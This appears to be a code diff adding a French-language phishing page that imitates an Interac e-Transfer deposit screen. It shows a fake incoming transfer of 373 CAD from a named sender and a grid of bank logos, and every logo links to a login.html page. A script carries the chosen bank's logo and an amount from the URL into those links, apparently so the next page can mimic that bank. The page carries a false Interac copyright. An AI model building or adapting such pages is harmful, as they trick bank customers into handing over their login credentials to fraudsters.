@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interac e-Transfer</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; background-color: #f7f7f7; color: #333; }
+        .main-wrapper { max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        header { background-color: #2b2b18; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; color: white; }
+        .logo-head { background: #ffbf00; padding: 5px; border-radius: 4px; width: 42px; }
+        .transfer-box { padding: 30px 20px; }
+        .amount { font-size: 38px; font-weight: 600; margin: 10px 0; }
+        .details-bar { border-top: 1px solid #eee; border-bottom: 1px solid #eee; padding: 18px 20px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; font-weight: bold; }
+        .bank-section { background-color: #e8e8e8; padding: 20px; }
+        .search-area { display: flex; justify-content: flex-end; margin-bottom: 15px; }
+        .search-input { padding: 8px; border: 1px solid #ccc; border-radius: 4px 0 0 4px; outline: none; }
+        .search-btn { background: #ffbf00; border: none; padding: 8px 12px; border-radius: 0 4px 4px 0; cursor: pointer; }
+        .bank-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .bank-card { background: white; border-radius: 6px; height: 90px; display: flex; align-items: center; justify-content: center; border: 1px solid #ddd; text-decoration: none; transition: 0.2s; }
+        .bank-card:active { transform: scale(0.98); }
+        .bank-card img { width: 85%; height: 85%; object-fit: contain; }
+        .bottom-selection { padding: 40px 20px; text-align: center; }
+        .separator { width: 44px; height: 44px; background: #757575; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: -62px auto 25px; border: 4px solid white; font-weight: bold; }
+        .form-select { width: 100%; padding: 14px; margin: 10px 0 25px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; background: white; }
+        .btn-depot { background-color: #fbe6a2; border: 1px solid #d4c38d; padding: 16px; width: 70%; border-radius: 8px; font-weight: bold; font-size: 18px; color: #555; cursor: pointer; }
+        footer { padding: 30px 20px; text-align: center; border-top: 1px solid #eee; color: #666; font-size: 13px; }
+    </style>
+</head>
+<body>
+<div class="main-wrapper">
+    <header>
+        <img src="https://i.postimg.cc/Pr51t7b7/IMG-6655.png" class="logo-head">
+        <div style="font-weight: bold;">ENGLISH &nbsp; ≡</div>
+    </header>
+
+    <div class="transfer-box">
+        <div style="font-size: 22px;">📥 <b>Déposer vos fonds</b></div>
+        <div class="amount"><span id="prix-display">373,00</span> $ <small style="font-size: 18px; font-weight: normal;">CAD</small></div>
+        <p>De : <b id="nom-display">KOUAME ALAIN OKOU</b></p>
+    </div>
+
+    <div class="details-bar">Voir les détails du virement <span style="color: #ffbf00;">❯</span></div>
+
+    <div class="bank-section">
+        <div class="search-area">
+            <input type="text" class="search-input" placeholder="Chercher">
+            <button class="search-btn">🔍</button>
+        </div>
+        <div class="bank-grid" id="grid">
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/MTLW2vzq/IMG_6649.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/76Rx8fqq/IMG_6648.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/xT31qj5S/IMG_6634.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/5NS2j9gW/IMG_6635.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/sD4g1fmd/IMG_6636.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/Wbw1tp8R/IMG_6637.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/FsVH1FZ2/IMG_6638.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/rFNwzyJ3/IMG_6639.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/Hs9kjW2N/IMG_6640.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/SNfxjQrt/IMG_6641.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/RVLZqCRD/IMG_6642.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/YqzCj23X/IMG_6643.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/gkH2rcDN/IMG_6644.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/Ghxm93Qj/IMG_6645.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/X7kYXN8k/IMG_6646.png"></a>
+            <a href="login.html" class="bank-card"><img src="https://i.postimg.cc/KvD84cNf/IMG_6647.png"></a>
+        </div>
+    </div>
+
+    <div class="bottom-selection">
+        <div class="separator">OU</div>
+        <div style="text-align: left; font-size: 15px;">
+            <label>Choisir votre institution financière</label>
+            <select class="form-select"><option>Sélectionner une institution</option></select>
+            
+            <label>Choisir la province ou le territoire</label>
+            <select class="form-select"><option>Sélectionner une province</option></select>
+        </div>
+        <button class="btn-depot">Déposer ❯</button>
+    </div>
+
+    <footer>
+        <img src="https://i.postimg.cc/Pr51t7b7/IMG-6655.png" width="60"><br><br>
+        © 2000 — 2026 Interac Corp. Tous droits réservés.
+    </footer>
+</div>
+
+<script>
+    window.onload = function() {
+        const params = new URLSearchParams(window.location.search);
+        const prix = params.get('prix') || "373,00";
+        document.getElementById('prix-display').innerText = prix;
+        
+        // Transmission automatique du prix et du logo aux liens
+        document.querySelectorAll('.bank-card').forEach(card => {
+            const logo = encodeURIComponent(card.querySelector('img').src);
+            card.href = `login.html?logo=${logo}&prix=${prix}`;
+        });
+    };
+</script>
+</body>
+</html>
